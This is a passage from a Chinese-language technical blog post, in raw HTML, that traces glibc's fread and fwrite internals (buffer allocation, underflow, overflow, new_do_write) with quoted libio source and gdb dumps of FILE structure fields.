class="line">_IO_doallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_IO_buf_base)</span><br><span class="line">    return;</span><br><span class="line">  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; 0)</span><br><span class="line">    if (_IO_DOALLOCATE (fp) != EOF)</span><br><span class="line">      return;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br></pre></td></tr></table></figure></p><p>这里重新回顾下开始时的结构体状态，这些变量未被初始化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_read_ptr = 0x0, </span><br><span class="line">_IO_read_end = 0x0, </span><br><span class="line">_IO_read_base = 0x0, </span><br><span class="line">_IO_buf_base = 0x0, </span><br><span class="line">_IO_buf_end = 0x0,</span><br></pre></td></tr></table></figure></p><h6 id="IO-file-doallocate"><a href="#IO-file-doallocate" class="headerlink" title="_IO_file_doallocate"></a>_IO_file_doallocate</h6><p>因此开始检验是否被初始化，如果已经初始化就返回。检查标志位之后调用vtable中的_IO_file_doallocate，由注释可以看到这个函数主要用来分配输入缓冲区。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/* Allocate a file buffer, or switch to unbuffered I/O.  Streams for</span><br><span class="line">   TTY devices default to line buffered.  */</span><br><span class="line">int</span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t size;</span><br><span class="line">  char *p;</span><br><span class="line">  struct stat64 st;</span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;</span><br><span class="line">  if (fp-&gt;_fileno &gt;= 0 &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), 0) &gt;= 0)</span><br><span class="line">    &#123;</span><br><span class="line">      if (S_ISCHR (st.st_mode))</span><br><span class="line">&#123;</span><br><span class="line">  /* Possibly a tty.  */</span><br><span class="line">  if (</span><br><span class="line">#ifdef DEV_TTY_P</span><br><span class="line">      DEV_TTY_P (&amp;st) ||</span><br><span class="line">#endif</span><br><span class="line">      local_isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">&#125;</span><br><span class="line">#if defined _STATBUF_ST_BLKSIZE</span><br><span class="line">      if (st.st_blksize &gt; 0 &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">size = st.st_blksize;</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br><span class="line">  p = malloc (size);</span><br><span class="line">  if (__glibc_unlikely (p == NULL))</span><br><span class="line">    return EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, 1);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_doallocate)</span><br></pre></td></tr></table></figure></p><p>首先调用_IO_SYSSTAT去获取文件信息，_IO_SYSSTAT函数是vtable中的 __stat函数，获取文件信息，这里是通过_fxstat64来获取，其内部是通过系统调用来实现，之后对size进行设置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_file_stat (_IO_FILE *fp, void *st)</span><br><span class="line">&#123; </span><br><span class="line">    return __fxstat64 (_STAT_VER, fp-&gt;_fileno, (struct stat64 *) st);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_stat)</span><br></pre></td></tr></table></figure></p><p>再之后通过malloc得到分配的缓冲区，再调用<code>_IO_setb</code>设置FILE缓冲区<br>跟进_IO_setb,设置了_IO_buf_base和_IO_buf_end，还有_flags<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_setb (FILE *f, char *b, char *eb, int a)</span><br><span class="line">&#123;</span><br><span class="line">  if (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    free (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  if (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  else</span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure></p><p>之后逐步返回到_IO_file_xsgetn</p><p>可以看到_IO_buf_base与_IO_buf_end都被设置了，大小为0x1000<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_buf_base = 0x602240 &quot;&quot;, </span><br><span class="line">_IO_buf_end = 0x603240 &quot;&quot;,</span><br></pre></td></tr></table></figure></p><h5 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">while (want &gt; 0)    </span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      if (want &lt;= have)                                  //如果缓冲区里有足够的字符，就直接将缓冲区里的字符复制到目标区</span><br><span class="line">&#123;</span><br><span class="line">  memcpy (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">  want = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   else</span><br><span class="line">&#123;</span><br><span class="line">  if (have &gt; 0)                                       //如果缓冲区字符不够，就将其先复制到目标区</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="第四步：-underflow"><a href="#第四步：-underflow" class="headerlink" title="第四步：__underflow"></a>第四步：__underflow</h5><p>因为是第一次读取数据，此时的fp-&gt;_IO_read_end以及fp-&gt;_IO_read_ptr都是0，因此会进入到__underflow<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* If we now want less than a buffer, underflow and repeat</span><br><span class="line">     the copy.  Otherwise, _IO_SYSREAD directly to</span><br><span class="line">     the user buffer. */</span><br><span class="line">  if (fp-&gt;_IO_buf_base</span><br><span class="line">      &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))       //输入缓冲区不能满足需求，调用__underflow读入数据</span><br><span class="line">    &#123;</span><br><span class="line">      if (__underflow (fp) == EOF)</span><br><span class="line">break;</span><br><span class="line"></span><br><span class="line">      continue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>进入__underflow函数，位于/libio/genops.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">__underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if (_IO_vtable_offset (fp) == 0 &amp;&amp; _IO_fwide (fp, -1) != -1)</span><br><span class="line">    return EOF;</span><br><span class="line"></span><br><span class="line">  if (fp-&gt;_mode == 0)</span><br><span class="line">    _IO_fwide (fp, -1);</span><br><span class="line">  if (_IO_in_put_mode (fp))</span><br><span class="line">    if (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      return EOF;</span><br><span class="line">  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    return *(unsigned char *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  if (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">return *(unsigned char *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  if (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      if (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  else if (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  return _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__underflow)</span><br></pre></td></tr></table></figure></p><p>可以看到经过一些检查之后会调用_IO_UNDERFLOW,跟进，调用了/libio/fileops.c中的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br></pre></td></tr></table></figure></p><p>检查FILE结构体的_flag标志位是否包含_IO_NO_READS，如果存在这个标志位则直接返回EOF，其中_IO_NO_READS标志位的定义是#define _IO_NO_READS 4 /<em> Reading not allowed </em>/。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>如果fp-&gt;_IO_buf_base为null，则调用_IO_doallocbuf分配输入缓冲区。和前面一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    return *(unsigned char *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  if (fp-&gt;_IO_buf_base == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Maybe we already have a push back pointer.  */</span><br><span class="line">      if (fp-&gt;_IO_save_base != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  free (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>接着初始化设置FILE结构体指针，将他们都设置成fp-&gt;_IO_buf_base<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">  = fp-&gt;_IO_buf_base;</span><br></pre></td></tr></table></figure></p><p>调用_IO_SYSREAD（vtable中的_IO_file_read函数），该函数最终执行系统调用read，读取文件数据，<br>数据读入到fp-&gt;_IO_buf_base中，读入大小为输入缓冲区的大小fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br></pre></td></tr></table></figure></p><p>设置输入缓冲区已有数据的size，即设置fp-&gt;_IO_read_end为fp-&gt;_IO_read_end += count。<br>设置完之后通过while循环进入第二部分将输入缓冲区拷贝至目标缓冲区，流程结束，返回。</p><ul><li>ray-cp大佬解释了下为什么最后在_IO_UNDERFLOW中又一次检查调用了_IO_doallocbuf分配输入缓冲区。因为虽然一般的输入底层都在调用__underflow函数，但是并非全部,scanf函数调用的是_u_flow函数，其内部并未提前分配缓冲区，之后也调用了_IO_UNDERFLOW函数，因此需要在这里进行缓冲区的分配。</li></ul><h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><h2 id="框架-2"><a href="#框架-2" class="headerlink" title="框架"></a>框架</h2><p>主体是_IO_new_file_xsputn函数，该函数调用_IO_new_file_overflow建立刷新缓冲区，<br>其中_IO_file_doallocate负责缓冲区的申请建立<br>最后调用_IO_default_xsputn将剩余输出至输出缓冲区</p><h2 id="细节-2"><a href="#细节-2" class="headerlink" title="细节"></a>细节</h2><h3 id="fwrite-gt-IO-fwrite"><a href="#fwrite-gt-IO-fwrite" class="headerlink" title="fwrite-&gt;_IO_fwrite"></a>fwrite-&gt;_IO_fwrite</h3><p>跟进，进入_IO_fwrite函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_fwrite (const void *buf, size_t size, size_t count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t request = size * count;</span><br><span class="line">  size_t written = 0;</span><br><span class="line">  CHECK_FILE (fp, 0);</span><br><span class="line">  if (request == 0)</span><br><span class="line">    return 0;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)</span><br><span class="line">    written = _IO_sputn (fp, (const char *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  /* We have written all of the input in case the return value indicates</span><br><span class="line">     this or EOF is returned.  The latter is a special case where we</span><br><span class="line">     simply did not manage to flush the buffer.  But the data is in the</span><br><span class="line">     buffer and therefore written as far as fwrite is concerned.  */</span><br><span class="line">  if (written == request || written == EOF)</span><br><span class="line">    return count;</span><br><span class="line">  else</span><br><span class="line">    return written / size;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fwrite)</span><br></pre></td></tr></table></figure><h3 id="IO-sputn-gt-IO-new-file-xsputn"><a href="#IO-sputn-gt-IO-new-file-xsputn" class="headerlink" title="_IO_sputn-&gt;_IO_new_file_xsputn"></a>_IO_sputn-&gt;_IO_new_file_xsputn</h3><p>可以看到前面的流程和fread相似，之后调用了主体函数_IO_sputn，跟进，进入了/libio/fileops.c中的_IO_new_file_xsputn<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_new_file_xsputn (FILE *f, const void *data, size_t n)</span><br><span class="line">...</span><br><span class="line">/* First figure out how much space is available in the buffer. */</span><br><span class="line">  if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      if (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  const char *p;</span><br><span class="line">  for (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      if (*--p == &apos;\n&apos;)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + 1;</span><br><span class="line">  must_flush = 1;</span><br><span class="line">  break;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */</span><br></pre></td></tr></table></figure></p><p>这一段判断了缓冲区剩余的空间，存在了count中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/* Then fill the buffer. */</span><br><span class="line"> if (count &gt; 0)</span><br><span class="line">   &#123;</span><br><span class="line">     if (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">     f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">     s += count;</span><br><span class="line">     to_do -= count;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>如果缓冲区还有剩余，则将数据拷贝至输出缓冲区。并计算是否还有目标输出剩余<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> if (to_do + must_flush &gt; 0)</span><br><span class="line">   &#123;</span><br><span class="line">     size_t block_size, do_write;</span><br><span class="line">     /* Next flush the (full) buffer. */</span><br><span class="line">     if (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">/* If nothing else has to be written we must not signal the</span><br><span class="line">   caller that everything has been written.  */</span><br><span class="line">return to_do == 0 ? EOF : n - to_do;</span><br></pre></td></tr></table></figure></p><h3 id="IO-OVERFLOW-gt-IO-new-file-overflow"><a href="#IO-OVERFLOW-gt-IO-new-file-overflow" class="headerlink" title="_IO_OVERFLOW-&gt;_IO_new_file_overflow"></a>_IO_OVERFLOW-&gt;_IO_new_file_overflow</h3><p>如果还有剩余，则说明缓冲区未建立或已经满了，需要使用_IO_OVERFLOW刷新缓冲区。跟进该函数，是位于fileops.c中的_IO_new_file_overflow<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, int ch)</span><br></pre></td></tr></table></figure></p><p>继续跟进，先检查是否有_IO_NO_WRITE标志位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */</span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno (EBADF);</span><br><span class="line">    return EOF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>检查_IO_write_base是否为空，若为空则分配输出缓冲区。这里调用的是_IO_doallocbuf来分配，与fread中相同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</span><br><span class="line">   &#123;</span><br><span class="line">     /* Allocate a buffer if needed. */</span><br><span class="line">     if (f-&gt;_IO_write_base == NULL)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进_IO_setg，是一句宏，将与read相关的三个指针赋值为_IO_buf_base<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span><br><span class="line">(fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span><br></pre></td></tr></table></figure></p><p>可以看下修改结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_read_ptr = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_read_end = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_read_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_write_base = 0x0, </span><br><span class="line">_IO_write_ptr = 0x0, </span><br><span class="line">_IO_write_end = 0x0, </span><br><span class="line">_IO_buf_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_buf_end = 0x604480 &quot;&quot;,</span><br></pre></td></tr></table></figure></p><p>再之后就是相关指针的设置，对读写相关的指针与flags等进行了赋值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_flags = -72536956,   --&gt; 0xfbad2c84</span><br><span class="line">_IO_read_ptr = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_read_end = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_read_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_write_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_write_ptr = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_write_end = 0x604480 &quot;&quot;, </span><br><span class="line">_IO_buf_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_buf_end = 0x604480 &quot;&quot;,</span><br></pre></td></tr></table></figure></p><p>赋值之后就要开始调用_IO_do_write函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &apos;\n&apos;))</span><br><span class="line">    if (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      return EOF;</span><br></pre></td></tr></table></figure></p><h3 id="IO-do-write-gt-IO-new-do-write"><a href="#IO-do-write-gt-IO-new-do-write" class="headerlink" title="_IO_do_write-&gt;_IO_new_do_write"></a>_IO_do_write-&gt;_IO_new_do_write</h3><p>跟进调用了fileops.c中的_IO_new_do_write<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_do_write (FILE *fp, const char *data, size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  return (to_do == 0</span><br><span class="line">  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure></p><h3 id="new-do-write"><a href="#new-do-write" class="headerlink" title="new_do_write"></a>new_do_write</h3><p>看到主要调用了new_do_write函数，位于该函数下方。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">static size_t</span><br><span class="line">new_do_write (FILE *fp, const char *data, size_t to_do)</span><br></pre></td></tr></table></figure></p><p>看到刚开始进行了标志位的判断，然后看read_end与write_base是否存在偏移，有则调用_IO_SYSSEEK校正指针位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">   /* On a system without a proper O_APPEND implementation,</span><br><span class="line">      you would need to sys_seek(0, SEEK_END) here, but is</span><br><span class="line">      not needed nor desirable for Unix- or Posix-like systems.</span><br><span class="line">      Instead, just indicate that offset (before and after) is</span><br><span class="line">      unpredictable. */</span><br><span class="line">   fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"> else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">   &#123;</span><br><span class="line">     off64_t new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);</span><br><span class="line">     if (new_pos == _IO_pos_BAD)</span><br><span class="line">return 0;</span><br><span class="line">     fp-&gt;_offset = new_pos;</span><br><span class="line">   &#125;</span><br><span class="line"> if (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">     fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;</span><br></pre></td></tr></table></figure></p><p>之后调用_IO_SYSWRITE输出输出缓冲区的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count = _IO_SYSWRITE (fp, data, to_do);</span><br></pre></td></tr></table></figure></p><h3 id="IO-SYSWRITE-gt-IO-new-file-write"><a href="#IO-SYSWRITE-gt-IO-new-file-write" class="headerlink" 